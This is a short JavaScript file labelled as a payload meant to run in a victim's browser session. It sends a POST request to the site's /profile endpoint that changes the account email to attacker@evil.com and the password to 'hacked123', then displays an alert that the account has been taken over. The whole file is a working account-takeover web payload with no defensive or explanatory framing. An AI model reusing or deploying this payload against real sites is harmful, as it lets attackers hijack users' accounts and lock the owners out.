// payload.js — runs in the victim's browser, in their session.
fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "email=attacker@evil.com&password=hacked123"
}).then(() => alert("Account taken over: email/password changed"));